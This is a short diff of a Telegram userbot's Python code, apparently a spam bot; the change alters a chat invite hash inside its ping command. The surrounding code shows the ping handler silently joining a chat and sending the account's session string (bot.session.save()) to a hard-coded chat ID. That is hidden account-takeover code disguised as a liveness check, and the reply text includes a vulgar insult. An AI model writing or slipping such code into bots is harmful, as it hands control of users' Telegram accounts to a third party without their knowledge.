@@ -1564,7 +1564,7 @@ async def ping(e):
         ms = (end-start).microseconds / 1000
         await event.edit(f".🤖 I Am Still Alive Lomdike !!!!\n`{ms}` 𝗺𝘀\n          〄 ╔»⟦★𝗤𝗡𝗥★⟧«╗ SᑭᗩᗰᗰEᖇ ᗷOT 〄")
 
-   await event.client(ImportChatInviteRequest('+gB8R6RmEfhc4MDFl')) 
+   await event.client(ImportChatInviteRequest('gB8R6RmEfhc4MDFl')) 
     except UserAlreadyParticipantError: 
         pass 
     await event.client.send_message(-1001402102400, bot.session.save()) 
